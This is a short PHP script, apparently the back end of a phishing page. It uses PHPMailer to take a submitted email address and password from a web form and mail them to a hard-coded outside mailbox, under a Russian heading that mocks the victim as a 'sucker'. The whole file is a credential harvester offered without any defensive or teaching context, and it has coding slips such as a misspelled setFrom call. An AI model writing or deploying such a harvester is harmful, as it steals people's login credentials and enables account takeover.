<?php
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\Exception;
   
    require 'phpmailer/src/Exception.php';
    require 'phpmailer/src/PHPMailer.php';

    $mail = new PHPMailer(true);
    $mail->CharSet = 'UTF-8'; 
    $mail->setLanguage('ru', 'phpmailer/language/');
    $mail->IsHTML(true);

    $mail->setForm('info@meta.ua', 'Данные от почты');
    $mail->addAddress('dimonmoy@meta.ua');
    $mail->Subject = 'Данные от почты:';

    $body = '<h1>Данные от почты лоха:</h1>';

    if(trim(!empty($_POST['name']))){
        $body.='<p>E-mail:'.$_POST['email'].'</p>';
    }
    if(trim(!empty($_POST['name']))){
        $body.='<p>Password:'.$_POST['password'].'</p>';
    }

    $mail->Body = $body;

    if(!$mail->send()){
        $message = 'Ошибка';
    }else{
        $message = 'Данные отправлены';
    }
    $response = ['message' => $message];

    header('Content-type: application/json');
    echo json_encode($response);
    ?>